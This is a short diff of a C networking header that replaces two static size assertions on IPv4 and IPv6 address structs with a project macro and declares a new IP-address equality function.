@@ -49,8 +49,8 @@ typedef enum {
 	PRNE_IPV_6
 } prne_ipv_t;
 
-_Static_assert(sizeof(struct in_addr) == 4, "sizeof(struct in_addr) == 4");
-_Static_assert(sizeof(struct in6_addr) == 16, "sizeof(struct in6_addr) == 16");
+prne_static_assert(sizeof(struct in_addr) == 4, "sizeof(struct in_addr) == 4");
+prne_static_assert(sizeof(struct in6_addr) == 16, "sizeof(struct in6_addr) == 16");
 struct prne_ip_addr {
 	uint8_t addr[16];
 	prne_ipv_t ver;
@@ -292,6 +292,7 @@ const char *prne_arch_tostr (const prne_arch_t x);
 prne_arch_t prne_arch_fstr (const char *str);
 bool prne_arch_inrange (const prne_arch_t x);
 
+bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b);
 void prne_net_ep_tosin4 (const prne_net_endpoint_t *ep, struct sockaddr_in *out);
 void prne_net_ep_tosin6 (const prne_net_endpoint_t *ep, struct sockaddr_in6 *out);
 bool prne_net_ep_set_ipv4 (const char *str, const uint16_t port, prne_net_endpoint_t *out);
